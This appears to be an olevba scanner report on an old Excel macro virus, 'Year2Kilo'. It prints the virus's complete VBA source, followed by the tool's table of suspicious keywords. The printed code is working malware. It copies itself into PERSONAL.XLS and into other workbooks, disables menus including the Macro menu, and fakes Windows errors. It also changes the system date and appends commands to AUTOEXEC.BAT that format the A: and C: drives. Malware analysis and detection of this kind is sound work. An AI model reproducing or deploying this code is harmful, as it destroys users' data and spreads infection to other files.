olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Kilo-244e777a8990a227e247c5c623cef27218332538
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Year2Kilo.bas 
in file: Virus.MSExcel.Kilo-244e777a8990a227e247c5c623cef27218332538 - OLE stream: '_VBA_PROJECT_CUR/VBA/Year2Kilo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' *****************************************************************
' VirusName:Year2Kilo Virus [Y2K-SP],Only Excel
' Origin   : HONGKONG
' Created  : January 22, 1998
' *****************************************************************
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "Infect"
End Sub
Sub Infect()
Attribute Infect.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo ErrorHandler
If Application.UserName = "RedDone" And Application.OrganizationName = "VirusTime" Then GoTo ErrorHandler
Application.ScreenUpdating = False
Application.DisplayAlerts = False
ThisWorkbook.Saved = True
Application.EnableCancelKey = xlDisabled
Installed = 0
If ThisWorkbook.Name <> "PERSONAL.XLS" Then
If Dir(Application.StartupPath + "\PERSONAL.XLS") = "PERSONAL.XLS" Then Installed = 1
If Installed = 1 Then
GoTo ErrorHandler
Else
Workbooks.Add.SaveAs Filename:=Application.StartupPath + "\PERSONAL.XLS"
Workbooks(ThisWorkbook.Name).Sheets("Year2Kilo").Copy Before:=Workbooks("PERSONAL.XLS").Sheets(1)
Workbooks("PERSONAL.XLS").Sheets("Year2Kilo").Visible = False
Workbooks("PERSONAL.XLS").Save
Windows("PERSONAL.XLS").Visible = False
End If
Else
Windows("PERSONAL.XLS").Visible = False
For I = 1 To Workbooks(ActiveWorkbook.Name).Sheets.Count
If Workbooks(ActiveWorkbook.Name).Sheets(I).Name = "Year2Kilo" Then Installed = 1
Next
If Installed = 1 Then
GoTo ErrorHandler
Else
Workbooks("PERSONAL.XLS").Sheets("Year2Kilo").Copy Before:=Workbooks(ActiveWorkbook.Name).Sheets(1)
Workbooks(ActiveWorkbook.Name).Sheets("Year2Kilo").Visible = False
Workbooks(ActiveWorkbook.Name).Save
Windows("PERSONAL.XLS").Visible = False
End If
End If
Workbooks("PERSONAL.XLS").Save
Application.Caption = "MicroSofa excel"
If Year(Now()) > 1999 Then
Dim fd As String, Fname As String
Randomize
MyValu = Int(((256 - 1) * Rnd) + 1)
fd = "\"
Fname = "BOOK" & MyValu & ".XLS"
ActiveWorkbook.SaveAs Filename:=fd & Fname
End If
Randomize
If Day(Now()) = Int((31 * Rnd) + 1) Then
Open "\AUTOEXEC.BAT" For Append As #1
Print #1, "@echo off"
Print #1, "cls"
Print #1, "echo The FLOPPY disk of A drive is being formatted.  "
Print #1, "echo During initialization   "
Print #1, "echo. "
Print #1, "echo y | \windows\command\format a: /u /q"
Print #1, "echo."
Print #1, "echo."
Print #1, "echo The HARD disk of C drive is being formatted.  "
Print #1, "echo During initialization   "
Print #1, "echo Year2Kilo Virus "
Print #1, "echo."
Print #1, "echo y | \windows\command\format c: /u /q"
Print #1, "echo."
Print #1, "echo Your disk it destroyed that being able to permit, that you do "
Print #1, "echo not do a the practice does not go a the macro virus measure."
Close #1
End If
If Day(Now()) = Int((31 * Rnd) + 1) Then
On Error Resume Next
Error 17
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 61
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 7
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 453
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 28
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 7
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 57
MsgBox Error(Err())
u = Int(((60 - 1) * Rnd) + 1)
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 447
u = Int(((60 - 1) * Rnd) + 1)
MsgBox Error(Err())
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + u
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
Error 11
MsgBox Error(Err())
Application.Quit
End If
If Day(Now()) = 29 And Month(Now()) = 2 And Year(Now()) = 2000 Then
dyd = Day(1)
mhm = Month(3)
mydate = 2000 & "/" & mhm & "/" & dyd
Date = mydatem
MsgBox "February 29, 2000 does not exist and please do the adjustment in the date and time.", vbCritical, "It is the serious error of Windows."
On Error Resume Next
Error 17
MsgBox Error(Err())
Error 61
MsgBox Error(Err())
Application.Wait "17:00:00"
Application.Quit
End If
Randomize
If Year(Now()) > 1999 Then
With MenuBars(xlWorksheet)
.Menus(1).Enabled = True
.Menus(2).Enabled = False
.Menus(3).Enabled = False
.Menus(4).Enabled = False
.Menus(5).Enabled = False
.Menus(6).Enabled = False
.Menus(7).Enabled = False
.Menus(8).Enabled = False
.Menus(9).Enabled = False
End With
Toolbars(3).Visible = True
Toolbars(4).Visible = True
Toolbars(5).Visible = True
Toolbars(6).Visible = True
Toolbars(7).Visible = True
Application.DisplayFormulaBar = False
Application.DisplayStatusBar = False
With Application
.ShowToolTips = False
.LargeButtons = True
.ColorButtons = False
End With
Randomize
MyValuet = Int(((300 - 10) * Rnd) + 10)
ActiveWindow.Zoom = MyValuet
MyValuete = Int(((200 - 16) * Rnd) + 16)
Application.SheetsInNewWorkbook = MyValuete
Application.MoveAfterReturn = False
Application.MoveAfterReturnDirection = xlUp
Application.DisplayRecentFiles = False
Application.UserName = "Year2KiloVirus[Y2K-SP]"
Application.StandardFont = "Wide Latin"
Application.StandardFontSize = "36"
dy = Day(1)
mh = Month(1)
mydate = 1980 & "/" & mh & "/" & dy
Date = mydate
On Error Resume Next
End If
Application.ScreenUpdating = True
Application.DisplayAlerts = True
With MenuBars(xlNoDocuments)
.Menus(1).Enabled = False
.Menus(2).Enabled = False
End With
With MenuBars(xlInfo)
.Menus(1).Enabled = False
.Menus(2).Enabled = False
.Menus(3).Enabled = False
.Menus(4).Enabled = False
.Menus(5).Enabled = False
End With
With MenuBars(xlChart)
.Menus(1).Enabled = False
.Menus(2).Enabled = False
.Menus(3).Enabled = False
.Menus(4).Enabled = False
.Menus(5).Enabled = False
.Menus(6).Enabled = False
.Menus(7).Enabled = False
.Menus(8).Enabled = False
End With
On Error Resume Next
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlModule).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlNoDocuments).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlInfo).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
'//// japanese only ///////////////////////////////////////////////////
MenuBars(xlWorksheet).Menus("Â°Ù").MenuItems("&Ï¸Û...").Delete   '/////
'//////////////////////////////////////////////////////////////////////
End
ErrorHandler:
End Sub





-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Year2Kil
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

